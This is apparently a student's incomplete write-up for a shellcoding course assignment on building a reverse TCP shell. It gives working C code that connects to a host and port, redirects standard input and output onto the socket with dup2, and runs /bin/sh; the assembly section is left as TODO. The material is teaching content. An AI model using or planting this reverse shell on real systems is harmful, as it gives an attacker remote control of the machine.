---
title:  Assignment 2
description: Create a Shell_Reverse_TCP shellcode
order: 2
---

[&lt;&lt; Go Back]({{ site.baseurl }})


# {{ page.title }}
### {{ page.description }}
___
<div style="text-align:right;direction:ltr;margin-left:1em;"><h6>{{ page.date }}</h6></div>

As we did with the bind shell, let's start with a c model:
```c
/* reverse_tcp_model.c
 *  - connect to a host, provide shell.
 */

#include <sys/socket.h>	// socket, AF_INET, SOCK_STREAM
#include <unistd.h>	// dup2
#include <netinet/in.h>	// sockaddr, htons, INADDR_ANY
#include <arpa/inet.h>	// inet_addr

int main() {
	int port = 4444;
	const char *host = "127.0.0.1";
	int sockfd;
	struct sockaddr_in sockaddr;

	// Build socket

	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	// Connect socket to host

	sockaddr.sin_family = AF_INET;
	sockaddr.sin_port = htons(port);
	sockaddr.sin_addr.s_addr = inet_addr(host);
	connect(sockfd, (struct sockaddr *) &sockaddr, sizeof(sockaddr));

	// Route i/o through connection

	dup2(sockfd, 0);
	dup2(sockfd, 1);
	dup2(sockfd, 2);

	// Execute /bin/sh

	execve("/bin/sh", 0, 0);

	return 0;
}
```

The reverse shell seems to be slightly smaller than the bind shell, as we seem to only have 4 syscalls to handle:
- socket
- connect
- dup2
- execve

The syscalls are nearly identical to those used in the bind shell, with only using **connect** with remote *host* and *port* instead of **bind** with local *host* and *port*.  Here is the same functionality in assembly:

```nasm
TODO
```

<br>
{% include preamble.md %}


[&lt;&lt; Go Back]({{ site.baseurl }})
